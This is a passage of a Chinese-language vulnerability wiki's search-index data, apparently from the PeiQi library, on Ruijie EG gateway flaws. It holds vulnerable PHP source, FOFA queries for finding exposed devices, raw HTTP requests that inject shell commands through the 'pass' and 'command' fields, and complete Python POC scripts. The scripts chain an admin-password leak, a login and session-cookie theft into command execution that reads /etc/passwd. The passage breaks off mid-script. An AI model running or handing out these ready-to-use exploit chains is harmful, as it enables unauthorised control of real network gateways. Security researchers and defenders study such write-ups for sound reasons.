","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-branch_passw.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-branch_passw.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞描述 锐捷EG易网关 branch_passw.php存在命令执行漏洞，配合 锐捷EG易网关 管理员账号密码泄露漏洞 达到RCE控制服务器 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-branch_passw.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-branch_passw.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞影响 锐捷EG易网关 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-branch_passw.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-branch_passw.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"网络测绘 app=\"Ruijie-EG易网关\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-branch_passw.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-branch_passw.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞复现 首先登录到后台中(可以组合 锐捷EG易网关 管理员账号密码泄露漏洞) 漏洞文件 branch_passw.php \u003c?php /** * 分支密码的统一管理 */ define('IN', true); //定位该文件是入口文件 define('DS', DIRECTORY_SEPARATOR); //定义系统目录分隔符 define('AROOT', dirname(__FILE__) . DS); //定义入口所在的目录 include_once(dirname(dirname(__FILE__)) . DS . 'mvc' . DS . 'controller' . DS . 'core.controller.php'); class defaultController extends coreController { private $filename; private $cli = \"evpn-server config all-clients file \\\"/data/evpn/cfg_pwd.text\\\"\"; function __construct() { parent::__construct(); $this-\u003efilename = DS . \"data\" . DS . \"evpn\" . DS . \"cfg_pwd.text\"; } /** * 设置分支设备的密码 * @param string post(pass) 分支密码 */ public function setAction() { $pass = p(\"pass\"); if ($pass == FALSE) { json_echo(false); return; } $command = \"/usr/local/evpn/server/cfg_pass.sh config \" . $pass; evpnShell($command); } /** * 关闭集中控制功能 */ function closeAction(){ evpnShell(\"/usr/local/evpn/server/cfg_pass.sh disable\"); } /** * 获取分支密码 */ function getAction() { $command = \"/usr/local/evpn/server/echo_pass.sh\"; $content = []; exec(EscapeShellCmd($command), $content); $data = array(\"status\" =\u003e true, \"data\" =\u003e isset($content[0]) \u0026\u0026 $content[0] === \"\" ? \"\" : $content); json_echo($data); } /** * 获取分支密码设置列表 */ function listAction(){ $province = p(\"province\"); $city = p(\"city\"); $district = p(\"district\"); $shell = \"/usr/local/evpn/server/sh_clients_pass.sh\"; if($province !== FALSE \u0026\u0026 $province != \"\"){ $shell .= \" province \".iconv(\"UTF-8\", \"GB2312//IGNORE\", $province); } if($city !== FALSE \u0026\u0026 $city != \"\"){ $shell .= \" city \".iconv(\"UTF-8\", \"GB2312//IGNORE\", $city); } if($district !== FALSE \u0026\u0026 $district != \"\"){ $shell .= \" district \".iconv(\"UTF-8\", \"GB2312//IGNORE\", $district); } header(\"Content-type: text/html;charset=gbk\"); header(\"Cache-Control: no-cache, must-revalidate\"); header(\"Pragma: no-cache\"); echo `$shell`; } } include_once dirname(dirname(__FILE__)) . '/init.php'; //mvc架构初始化 其中漏洞部分 /** * 设置分支设备的密码 * @param string post(pass) 分支密码 */ public function setAction() { $pass = p(\"pass\"); if ($pass == FALSE) { json_echo(false); return; } $command = \"/usr/local/evpn/server/cfg_pass.sh config \" . $pass; evpnShell($command); } \u0026pass**变量可控并且无过滤执行命令使用 | 即可绕过 发送请求包 POST /itbox_pi/branch_passw.php?a=set HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 41 Content-Type: application/x-www-form-urlencoded Cookie: RUIJIEID=52222egp72ilkpf2de7qbrigk3;user=admin; X-Requested-With: XMLHttpRequest Accept-Encoding: gzip pass=|cat /etc/psswd\u003e../test_test.txt 再访问 http://xxx.xxx.xxx.xxx/test_test.txt ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-branch_passw.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-branch_passw.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷EG网关 branch_passw.php 远程命令执行漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin\u0026password=admin?show+webmaster+user' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 show webmaster user \\033[0m\".format(target_url)) if \"data\" in response.text and response.status_code == 200: password = re.findall(r'admin (.*?)\"', response.text)[0] print(\"\\033[36m[o] 成功获取, 账号密码为: admin {} \\033[0m\".format(password)) POC_2(target_url, password) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, password): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin\u0026password={}'.format(password) try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在登录..... \\033[0m\".format(target_url)) if \"status\" in response.text and \"1\" in response.text and response.status_code == 200: ruijie_cookie = \"RUIJIEID=\" + re.findall(r\"'Set-Cookie': 'RUIJIEID=(.*?);\", str(response.headers))[0] + \";user=admin;\" print(\"\\033[36m[o] 成功获取管理员Cookie: {} \\033[0m\".format(ruijie_cookie)) POC_3(target_url, ruijie_cookie) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, ruijie_cookie): vuln_url = target_url + \"/itbox_pi/branch_passw.php?a=set\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(ruijie_cookie) } data = 'pass=|cat /etc/passwd\u003e../test_test.txt' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 cat /etc/passwd..... \\033[0m\".format(target_url)) if response.status_code == 200: POC_4(target_url, ruijie_cookie) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_4(target_url, ruijie_cookie): vuln_url = target_url + \"/test_test.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(ruijie_cookie) } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 cat /etc/passwd..... \\033[0m\".format(target_url)) if \"root:\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 成功读取 /etc/passwd \\n[o] 响应为:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-branch_passw.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:5:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-branch_passw.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"锐捷 EG易网关 cli.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 锐捷EG易网关 cli.php存在命令执行漏洞，配合 锐捷EG易网关 管理员账号密码泄露漏洞 达到RCE控制服务器 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 锐捷EG易网关 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Ruijie-EG易网关\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 首先登录到后台中(可以组合 锐捷EG易网关 管理员账号密码泄露漏洞) 漏洞文件 cli.php \u003c?php /** * cli命令查询 */ define('IN', true); //定位该文件是入口文件 define('DS', DIRECTORY_SEPARATOR); define('AROOT', dirname(__FILE__) . DS); include_once(AROOT . 'mvc' . DS . 'controller' . DS . 'core.controller.php'); class defaultController extends coreController { function __construct() { // 载入默认的 parent::__construct(); } /** * cli命令执行 */ public function indexAction() { $mode = p(\"mode_url\"); $command = p(\"command\"); $answer = p(\"answer\"); if ($mode == false) $mode = \"exec\"; if ($answer == false) $answer = \"\"; if ($command !== false) $command = iconv('UTF-8', 'GBK//IGNORE', $command); $data = execCli($mode, $command, $answer); if ($data[\"status\"] !== 1) { json_echo($data); exit(); } $res = preg_replace(array(\"/%01/\", \"/%22/\", \"/%09/\", \"/%0D/\", \"/%3A/\",\"/%07/\"), array(\"\", '\"', \"\\t\", \"\", \":\",\"\"), urlencode($data[\"data\"])); //先进行url编码防止gbk中文无法json,再过滤首尾空方块 $resArr = explode(\"%0A\", $res); //$resArr = preg_split(\"/\\r\\n|\\n/\", $data[\"data\"]); if ($mode == \"config\" \u0026\u0026 strstr($resArr[0], \"Enter+configuration+commands%2C+one+per+line.++End+with+CNTL%2FZ.\")) array_shift($resArr); $data[\"data\"] = $resArr; if (!headers_sent()) { header(\"Content-type: text/json;charset=gbk\"); //header(\"Expires: Thu, 01 Jan 1970 00:00:01 GMT\"); header(\"Cache-Control: no-cache, must-revalidate\"); header(\"Pragma: no-cache\"); } echo urldecode(json_encode($data)); //echo json_encode($data); } /** * 执行shell脚本 */ public function shellAction() { $command = p(\"command\"); if ($command == false) { $data[\"status\"] = 2; $data[\"msg\"] = \"no command\"; json_echo($data); exit(); } $content = []; exec(EscapeShellCmd($command), $content); $data = array(\"status\" =\u003e true, \"data\" =\u003e $content); json_echo($data); } /** * 获取系统时间 */ public function dateAction() { setTimeZone(); $data['status'] = true; $data[\"data\"][\"time\"] = date(\"Y-m-d H:i:s\"); $data[\"data\"][\"zone\"] = \"UTC\" . getTimeZone(); json_echo($data); } /** * 获取系统时区 */ public function datezoneAction() { $data['status'] = true; $data[\"data\"] = getTimeZone(); json_echo($data); } /** * 检测静态页面时候未登录直接进入 */ public function checkloginAction() { json_echo(array(\"status\" =\u003e true)); } } include_once(AROOT . \"init.php\"); //mvc初始化入口，放在底部 关键部分代码为 /** * 执行shell脚本 */ public function shellAction() { $command = p(\"command\"); if ($command == false) { $data[\"status\"] = 2; $data[\"msg\"] = \"no command\"; json_echo($data); exit(); } $content = []; exec(EscapeShellCmd($command), $content); $data = array(\"status\" =\u003e true, \"data\" =\u003e $content); json_echo($data); } command参数直接传入执行了命令 发送请求包 POST /cli.php?a=shell HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 24 Content-Type: application/x-www-form-urlencoded Cookie: RUIJIEID=nk5erth9i0pvcco3n7fbpa9bi0;user=admin; X-Requested-With: XMLHttpRequest Accept-Encoding: gzip notdelay=true\u0026command=id ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷EG网关 cli.php RCE \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin\u0026password=admin?show+webmaster+user' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 show webmaster user \\033[0m\".format(target_url)) if \"data\" in response.text and response.status_code == 200: password = re.findall(r'admin (.*?)\"', response.text)[0] print(\"\\033[36m[o] 成功获取, 账号密码为: admin {} \\033[0m\".format(password)) POC_2(target_url, password) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, password): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin\u0026password={}'.format(password) try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在登录..... \\033[0m\".format(target_url)) if \"status\" in response.text and \"1\" in response.text and response.status_code == 200: ruijie_cookie = \"RUIJIEID=\" + re.findall(r\"'Set-Cookie': 'RUIJIEID=(.*?);\", str(response.headers))[0] + \";user=admin;\" print(\"\\033[36m[o] 成功获取管理员Cookie: {} \\033[0m\".format(ruijie_cookie)) POC_3(target_url, ruijie_cookie) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, ruijie_cookie): vuln_url = target_url + \"/cli.php?a=shell\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(ruijie_cookie) } data = 'notdelay=true\u0026command=cat /etc/passwd' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 cat /etc/passwd..... \\033[0m\".format(target_url)) if \"root:\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 成功读取 /etc/passwd \\n[o] 响应为:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"锐捷 EG易网关 download.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 锐捷EG易网关 download.php 存在后台任意文件读取漏洞，导致可以读取服务器任意文件 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 锐捷EG易网关 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Ruijie-EG易网关\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 首先登录到后台中(可以组合 锐捷EG易网关 管理员账号密码泄露漏洞) 漏洞文件 download.php \u003c?php /** * 文件下载 */ define('IN', true); //定位该文件是入口文件 define('DS', DIRECTORY_SEPARATOR); define('AROOT', dirname(__FILE__) . DS); include_once(AROOT . 'mvc' . DS . 'controller' . DS . 'core.controller.php'); class defaultController extends coreController { /** * 应许下载的文件列表，不在该列表的文件一律不能下载，列表使用正则表达式 * @var array */ private $allow = array( \"/^\\/data\\/.*$/\", \"/^\\/mnt\\/sata0\\/webmail\\/.*$/\", \"/^\\/mnt\\/sata0\\/tech.+\\.tar\\.gz$$/\", \"/^\\/mnt\\/sata0\\/mail\\/.*$/\", \"/^\\/mnt\\/sata0\\/audit_export\\/.*$/\", \"/^\\/tmp\\/sslvpn\\/export\\/.*$/\", \"/^\\/mnt\\/sata0\\/web\\/nginx\\/html\\/sslvpn_pi\\/.*$/\", \"/^\\/tmp\\/.ca_web\\/.*$/\", \"/^\\/mnt\\/sata0\\/sslvpn\\/.*$/\", \"/^\\/tmp\\/html\\/utlog.*$/\", ); private $error; //错误描述 function __construct() { // 载入默认的 parent::__construct(); } /** * 文件下载处理 */ public function indexAction() { $filepath = v(\"file\"); $fileinfo = pathinfo($filepath); $filename = iconv(\"UTF-8\", \"GB2312\", $fileinfo[\"filename\"] . (isset($fileinfo[\"extension\"]) ? \".\" . $fileinfo[\"extension\"] : \"\")); //只能读取下载GB2312文件不然会有乱码 $filepointer = $this-\u003e_checkfile(iconv(\"UTF-8\", \"GB2312\",$filepath)); if ($filepointer !== false) { if (headers_sent()) { $this-\u003eerror = \"无法下载文件，已经输出其他请求头！\"; } else { header(\"Pragma: public\"); header(\"Expires: 0\"); header(\"Cache-Control: must-revalidate, post-check=0, pre-check=0\"); header(\"Cache-Control: private\", false); header(\"Content-Type: {$this-\u003e_getMimeType($filename)}\"); header(\"Content-Disposition: attachment; filename=\\\"{$filename}\\\";\"); header(\"Content-Transfer-Encoding: binary\"); header(\"Content-Length: {$this-\u003e_getFileSize($filepointer)}\"); @ob_clean(); rewind($filepointer); fpassthru($filepointer); exit(); } } if ($this-\u003eerror) { //有错误产生 ?\u003e \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003e文件下载失败\u003c/title\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"\u003e \u003cscript type=\"text/javascript\"\u003e alert(\"\u003c?php echo $this-\u003eerror; ?\u003e\"); \u003c/script\u003e \u003c/script\u003e \u003c/head\u003e \u003cbody\u003e\u003c/body\u003e \u003c/html\u003e \u003c?php } } /** * 读取文本文件内容，支持ajax请求 */ public function read_txtAction() { $filename = v(\"file\"); if (!file_exists($filename)) { $data[\"status\"] = 2; $data[\"msg\"] = $filename . \"不存在\"; json_echo($data); exit(); } else { $fileContent = file_get_contents($filename); $data = array(\"status\" =\u003e true, \"data\" =\u003e $fileContent); json_echo($data); } } /** * 文件检查 */ private function _checkfile($filename) { if ($filename == false) { $this-\u003eerror = \"请指定要下载的文件！\"; return FALSE; } $isallow = false; foreach ($this-\u003eallow as $pattern) { if (preg_match($pattern, $filename)) { $isallow = true; break; } } if (!$isallow) { $this-\u003eerror = \"该文件不允许下载！\"; return FALSE; } if (!is_file($filename)) { $this-\u003eerror = \"该文件不存在！\"; return FALSE; } else if (!is_readable($filename)) { //if (system(\"chmod +r \" . escapeshellarg($filename))) { $this-\u003eerror = \"无法下载该文件，没有权限！\"; return FALSE; //} } return fopen($filename, \"rb\"); } /** * 获取文件mime类型 * @param string $fileName 文件名 * @return string */ private function _getMimeType($fileName) { $charset = v(\"charset\"); switch (pathinfo($fileName, PATHINFO_EXTENSION)) { case \"pdf\": return \"application/pdf\"; case \"exe\": return \"application/octet-stream\"; case \"zip\": return \"application/zip\"; case \"doc\": return \"application/msword\"; case \"xls\": return \"application/vnd.ms-excel\"; case \"ppt\": return \"application/vnd.ms-powerpoint\"; case \"gif\": return \"image/gif\"; case \"png\": return \"image/png\"; case \"jpeg\": case \"jpg\": return \"image/jpg\"; case \"htm\": return \"text/html;charset=gbk\"; case \"html\": if(!$charset) { return \"text/html;charset=gbk\"; }else { return \"text/html;charset=UTF-8\"; } default: return \"application/force-download\"; } } /** * 获取文件大小 * @return int */ private function _getFileSize($filePointer) { $stat = fstat($filePointer); return $stat['size']; } } include_once AROOT.'init.php'; //mvc初始化入口，放在底部 关键代码为 /** * 读取文本文件内容，支持ajax请求 */ public function read_txtAction() { $filename = v(\"file\"); if (!file_exists($filename)) { $data[\"status\"] = 2; $data[\"msg\"] = $filename . \"不存在\"; json_echo($data); exi","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷EG网关 cli.php RCE \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin\u0026password=admin?show+webmaster+user' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 show webmaster user \\033[0m\".format(target_url)) if \"data\" in response.text and response.status_code == 200: password = re.findall(r'admin (.*?)\"', response.text)[0] print(\"\\033[36m[o] 成功获取, 账号密码为: admin {} \\033[0m\".format(password)) POC_2(target_url, password) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, password): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin\u0026password={}'.format(password) try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) 